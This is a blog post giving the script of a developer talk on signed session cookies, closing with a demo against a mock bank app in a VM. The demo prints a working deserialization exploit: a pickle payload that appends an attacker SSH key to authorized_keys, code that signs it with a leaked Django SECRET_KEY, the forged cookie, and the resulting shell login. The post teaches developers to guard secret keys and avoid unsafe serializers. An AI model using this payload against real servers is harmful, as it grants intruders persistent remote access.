Title: Session Management, Message Authentication, and the Tragedy of the SECRET_KEY
Date: 2026-08-11 14:35
Status: published
Category: computing
Tags: Python, Ruby

_(Script for a talk given at [App Academy](https://www.appacademy.io/) on 11 August 2014, belatedly blogged twelve years later in a fit of nostalgia for the world of mid-2010s web security)_

Hi, my name is Zack M. Davis. I'm a software engineer at SwiftStack, and App Academy class of December 2013. Today I want to first talk a little bit about how cookie-backed sessions in web applications work, and then give a little demonstration on one way in which a few critical mistakes can make everything go horribly, horribly wrong.

As you know, HTTP itself is stateless: the client sends out a request, it makes its way through a series of tubes, the server gets it, and sends its own response back. There's nothing in the protocol itself to let the server know anything about previous requests by the same client. If we want persistent sessions, where the application remembers a particular user being logged in and having their own data, that gets implemented separately by having the client and server pass a bit of data called a *cookie* back and forth in the request and response headers.

But what you may not have previous considered in much detail, is the question of exactly what data goes in the session cookie. If you're using Rails, in your controllers, you have access to a hash-like `session` object. For example, if you're writing an online store, you'd likely want to store the shopping cart of items a user intends to buy inside of the session. Maybe you'd have a method something like this somewhere&mdash;

```ruby
def add_item_to_cart!(item)
  session[:shopping_cart] << item.id
end
```

But that session hash map has to actually get stored somewhere. Where? There are two main approaches.

The first is database-backed sessions. The session data is actually stored in the database on the server, and the cookie only contains a randomly-generated session ID that is used to look up the session data in the database.

The second approach is cookie-backed sessions: to actually store the data itself inside of the cookie. This is what Rails does by default. (But there are other choices; you can specify what kind of sessions you want to use in `config/initializers/session_store.rb`.) Cookie-based sessions can offer an advantage in scalibility: say, if you want to distribute your application across several servers and have any one of them be able to respond without having to communicate with a central database, you can do that if the session data is right there as part of the request.

But an _extremely high_ level of caution is in order every time you're trusting data from a client. Suppose you were storing the ID of the logged-in user in the cookie without any sort of cryptographic protection. Then some malicious user could examine the cookie, send it back with their next request, and be logged in as someone else. That would be very bad, and that's why we _do_ have cryptographic protections for this sort of thing.

In Rails 4, the session data in the cookie is actually encrypted so that no one but the server can read it. In contrast, Rails 3 uses *signed* cookies. A signed cookie consists of two parts: the serialized session data itself, and a *signature* that gets computed from the session data together with the application's secret cryptographic signing key. The key is just a string that should be kept secret and should be long and random enough such that it would take someone a really long time to guess it; you know, maybe a few billion years or so. Anyone can read the session data, but only the application create or verify valid signatures&mdash;or at least, entities that have the application's secret key can create valid signatures. More about that in a moment. That way, malicious clients can't forge fraudulent cookies, because if they tamper with the session data, the signature won't match, and the application will notice this and refuse to accept the session.

So a typical Rails session cookie might look something like this:

```
BAh7CUkiDGFjY291bnQGOgZFVGkDjE4OSSIOaXNfbW9iaWxlBjsAVEZJIhN3YXJkZW4ubWVzc2FnZQY
7AFR7AEkiEF9jc3JmX3Rva2VuBjsAVEkiMUtxMldDeThLbEg4bmRQUldreERTMjBvRnJnS0w0SFM5Zz
N5MUR3Q3habms9BjsAVA==--178767448743ece18a645469224b5b839f5ce35a
```

&mdash;where the serialized session data and the signature are separated by the two hyphens. And indeed, without knowing the secret key which helped generate that signature, we can still deserialize the session hash&mdash;

```
irb(main):001:0> require 'rack'
=> true
irb(main):002:0> Rack::Session::Cookie::Base64::Marshal.new.decode "BAh7CUkiDGF
jY291bnQGOgZFVGkDjE4OSSIOaXNfbW9iaWxlBjsAVEZJIhN3YXJkZW4ubWVzc2FnZQY7AFR7AEkiEF
9jc3JmX3Rva2VuBjsAVEkiMUtxMldDeThLbEg4bmRQUldreERTMjBvRnJnS0w0SFM5ZzN5MUR3Q3hab
ms9BjsAVA=="
=> {"account"=>937612, "is_mobile"=>false, "warden.message"=>{}, "_csrf_token"=
>"Kq2WCy8KlH8ndPRWkxDS20oFrgKL4HS9g3y1DwCxZnk="}
```

So, I've been saying a lot about that secret cryptographic signing key. In Rails, that's going to be a variable named `secret_token` or `secret_key_base` if you're using the Rails 4 encrypted cookies, and it lives in `config/initializers/secret_token.rb`, or `config/secrets.yml` as of Rails 4.1. Interestingly, those files are _not_ in the default `.gitignore`.

Can I do a quick poll of the audience here? Please raise your hand if, while you were working on your final project, you were aware of the existence of this file and made sure that it did *not* get uploaded to a public GitHub repository? That is, raise your hand if you explicitly made sure other people could *not* see this file in your project.

...

Okay, everyone who didn't raise their hand is dead. Metaphorically speaking.

Because of course, an attacker who knows your secret session-signing key can forge valid session cookies, with all the horror that applies. And it can potentially be get even worse than that!&mdash;I'd like to show you a little demo I put together about that.

I know App Academy is a Ruby and Rails shop, but I actually used Python and Django for this, because that's why I work with all day and so it was easier for me to craft a nice example. Sorry about that; all the same high-level principles apply to rails. 

So, here we see a nice banking application at *supersecurebank.com* *(actually running in a VM on my laptop with the URL faked in /etc/hosts)*, where a user can log in and see their accounts.

Notice that if we, roleplaying an attacker, try to open a remote shell on *supersecurebank.com*, it doesn't let us.

```
zmd@SuddenHeap:~/Code/Secret_Key_Attack_Demo$ ssh -i attacker_id_rsa victim@supersecurebank.com
Permission denied (publickey).
``` 

Let's see what we can do about that. 

Now, Django uses database-backed sessions by default, but you can configure it to used cookie-backed sessions instead, and it particular, you can&mdash;you probably shouldn't, but you can&mdash;configure it to use Python's Pickle serailzation format. Pickle is a lot like Ruby's Marshal; it converts ("pickles") Python objects to text that you can save in a file and can "unpickle" it into a Python object later.  As the documentation rightly notes, Pickle is not secure and not intended to be used with untrusted data because it can be used to execute arbitrary code. For example, to deal with custom classes that the pickle module doesn't already know to deal with, you can define a `__reduce__` method on your classes that returns an immutable array (tuple) with a callable and arguments that tells Pickle how to reconstruct the object at unpickling time.

Now, it just so happens that *supersecurebank.com* is a Django app using the Pickle serializer for session cookies.

So suppose we define a class like this&mdash;

```python
class EvilPickle(object):
    def __reduce__(self):
        return (
            subprocess.call,
            (
                [
                    "sed",
                    "-i",
                    "$ a\ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdVqkIbBBLto8tjcNY17CLoBvrIdii/+dp6Ia4pAs/zg3jSvRLlzXqu0Z/FEdyY8PoAxoE/Ho0SqWaQvG8PP9moVLPL7KsbOY9QB6R/fDRS1d71TukFg+4ytp4NwbILuqQqlMAFq5F+qxHxDalr2sySiy5iKE30dlD44Hr80kF3IDtbxeC78as97q4Og8AoJSnQTxJ1J03AKXHQqcQHAyLT2RpJlKBedhm9KqRWOxUE6+sP7WfZ9H0gwdaYzz/Kx8PkJf3DKlGay5zUBgmLpmNjpXblGIkw5gJyRGJsYBtLq9rwHgoAOVi5i4fOUbCGIBPW84jYC6wEqnuCK/s5X+h penetrationtest@appacademy.io",
                    "/home/victim/.ssh/authorized_keys",
                ],
            ),
        )
```

What that reduce method is saying is that when Pickle tries to deserialize this class, it should use subprocess.call to invoke sed to append this ssh public key (the one we used earlier to try to ssh in) to `/home/victim/.ssh/authorized_keys`.

The application's secret key lives in a settings variable called SECRET_KEY.

```python
# Make this unique, and don't share it with anybody.
SECRET_KEY = '2%vcwe5gdx=@69_+97c=*yx1zx&s0+oysq!egnotzz)37sad-m'
```

So if we use the SECRET_KEY and Django's signing functions to pickle an instance of our `EvilPickle` class

```python
import os
os.environ['DJANGO_SETTINGS_MODULE'] = (
    "My_Super_Secure_Banking_Application.settings"
)
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing

def evil_session_id():
    return signing.dumps(
        EvilPickle(),
        key="2%vcwe5gdx=@69_+97c=*yx1zx&s0+oysq!egnotzz)37sad-m",
        serializer=PickleSerializer,
        salt="django.contrib.sessions.backends.signed_cookies",
        compress=True
    )

print "sessionid=" + evil_session_id()
```

and use *that* as our cookie on our next request&mdash;

```
(Secret_Key_Attack_Demo)zmd@SuddenHeap:~/Code/Secret_Key_Attack_Demo$ python evil_pickle.py
sessionid=.eJwVkcuSmkAAAHfdPKr2K0xVDqmyVlBA4BZeyisKKCpbSaUGGHEEHIYBBU655Dvyq9ntW_e1_4wS2sZVjRNI6XMCiuKZPP4io2_hE4UpeQpHL4h82P17fHj4OgY_x5SeX2oKxsobKrcegDbrk7nxrrriK-p7Vnwt3ZPcilXVbbDUXJJ1NBM1F6u32koRYiZptbAAXymUGTLusr0FbjEcScu-Mksj7SPJw0qHDcbE7JYcgH9bSZ4nl3jveq7o0HgTyb66CJiTHmxnqTjbtfkym_B9U_Hre2y5LfFJ8UNZEmE5IZ3Z6aCo57Tfol5AjsGxaaHzvFlLbL7kLL2JO6iJEqCySPhNJinY3l79XWfPbJZTnKPpk8Q3ld7dzYPKLhwVpudSdkhw2HShsZhQTzycXmWTze4piIaBcTrJy-0TpzvFCvTCEKpZ6Vbl-lId42Jl5Xchs_tgZdNIbVwi13czw8pmjwTEnzZhrK0s1TtI_CXSFneDXFvNYahwnJzHFbzCpgYNwtcG0uY7qCqQgBSW_RRh8jH8wpxxCZkbShpUMtO3VwxomzOu0QDT3znsKfkE_wbk8_Q_w_2mfA:1XE6Ru:3eb_aMxa7FGh38nrySH5yvKBDhw
```

&mdash;then when the server gets our poisoned request, it should execute that sed command, which will let us log on.

*(use Cookies Manager+ to set sessionid cookie, refresh page, observe 500 error page)*

&mdash;which is exactly what happens.

```
zmd@SuddenHeap:~/Code/Secret_Key_Attack_Demo$ ssh -i attacker_id_rsa victim@supersecurebank.com
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-30-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Mon Aug  4 00:23:37 UTC 2014

  System load:  0.0               Processes:           92
  Usage of /:   3.3% of 39.34GB   Users logged in:     1
  Memory usage: 39%               IP address for eth0: 10.0.2.15
  Swap usage:   0%                IP address for eth1: 192.168.33.14

  Graph this data and manage this system at:
    https://landscape.canonical.com/

  Get cloud support with Ubuntu Advantage Cloud Guest:
    http://www.ubuntu.com/business/services/cloud


Last login: Mon Aug  4 00:23:37 2014 from 192.168.33.1
victim@supersecurebank:~$ echo "pwned"
pwned
```

So, granted, I've made very generous assumptions to the attacker here, but at the same time, before seeing this, would you have expected that publishing one of your app's configuration settings and using an unsafe serializer on your server could so easily lead to it not being your server anymore? So I hope this has been an an inspiring and terrifying demonstration of the importance of constant vigilance. Thank you.
